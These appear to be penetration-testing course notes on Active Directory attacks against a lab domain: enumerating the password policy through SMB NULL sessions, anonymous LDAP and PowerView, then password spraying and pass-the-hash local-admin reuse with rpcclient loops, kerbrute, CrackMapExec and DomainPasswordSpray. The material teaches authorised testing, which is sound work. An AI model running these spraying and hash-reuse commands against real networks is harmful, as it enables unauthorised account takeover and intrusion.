# Enumerating the Password Policy
With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec or rpcclient.
## Linux
```
$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### SMB NULL Sessions
SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.


**Using rpcclient**
```
$ rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
```

**Using enum4linux**
```
$ enum4linux -P 172.16.5.5
```

**Using enum4linux-ng**
```
$ enum4linux-ng -P 172.16.5.5 -oA ilfreight

$ cat ilfreight.json 
```

**LDAP Anonymous Bind**
```
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## Windows
### Enumerating Null Session.
```
> net use \\DC01\ipc$ "" /u:""
```

#### Using net.exe
```
> net accounts
```

### Using PowerView
```
PS > import-module .\PowerView.ps1
> Get-DomainPolicy
```

# Password Spraying
Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.

## Linux
Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.


### Using a Bash one-liner
```
$for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Using Kerbrute 
```
$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

### Using CrackMapExec 
```
$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

**Validating the Credentials with CrackMapExec**
```
$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

**Local Administrator Password Reuse**
```
$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Windows
### Using DomainPasswordSpray.ps1
```
PS > Import-Module .\DomainPasswordSpray.ps1
PS > Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
